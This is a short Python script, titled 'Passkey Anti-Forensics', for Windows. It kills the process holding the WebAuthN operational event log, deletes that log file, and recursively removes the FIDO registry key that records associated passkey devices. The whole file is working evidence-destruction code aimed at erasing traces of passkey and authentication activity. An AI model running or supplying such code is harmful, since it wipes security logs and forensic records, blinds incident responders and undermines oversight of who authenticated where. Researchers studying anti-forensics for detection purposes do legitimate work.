import winreg
import os
import psutil

REGISTRY_PATH = fr"S-1-5-20\Software\Microsoft\Cryptography\FIDO"

def find_process_using_file(file_path):
    for proc in psutil.process_iter(['pid', 'name', 'open_files']):
        try:
            open_files = proc.info['open_files']
            if open_files:
                for open_file in open_files:
                    if open_file.path == file_path:
                        return proc
        except (psutil.AccessDenied, psutil.NoSuchProcess):
            continue
    return None


def delete_evtx_file(evtx_filename):
    """
    Deletes the specified EVTX file from the logs directory.

    :param evtx_filename: The name of the EVTX file to delete.
    """
    # Construct the full path to the EVTX file
    evtx_file_path = os.path.join(os.environ['WINDIR'], "\\Windows\\System32\\winevt\\Logs", evtx_filename)

    try:
        # Check if the file exists
        if os.path.exists(evtx_file_path):
            # Find the process using the file
            proc = find_process_using_file(evtx_file_path)
            if proc:
                print(f"Process {proc.info['name']} (PID: {proc.info['pid']}) is using this file.")
                print(f"Finishing process {proc.info['name']} (PID: {proc.info['pid']}) to delete the file.")
                proc.terminate()
                proc.wait()  # Wait for the process to terminate

            # Attempt to delete the file
            os.remove(evtx_file_path)
            print(f"--EVTX file successfully deleted {evtx_file_path}--")
        else:
            print(f"The file {evtx_file_path} does not exist")
    except Exception as e:
        print(f"An error occurred when trying to delete the file: {e}")


def delete_registry_key(key, sub_key_name: str):
    try:
        with winreg.OpenKey(key, sub_key_name) as sub_key:
            while True:
                try:
                    sub_sub_key_name = winreg.EnumKey(sub_key, 0)
                    delete_registry_key(sub_key, sub_sub_key_name)
                except OSError:
                    break
        winreg.DeleteKey(key, sub_key_name)
        print("--Associated devices have been deleted successfully--")
    except:
        print(f"A Key {key}\\{sub_key_name} does not exist")


# Example usage
if __name__ == "__main__":
    print("--- Passkey Anti-Forensics ---")
    print("Trying to delete EVTX file")
    delete_evtx_file("Microsoft-Windows-WebAuthN%4Operational.evtx")

    print("Trying to delete registry entries")
    delete_registry_key(winreg.HKEY_USERS, REGISTRY_PATH)


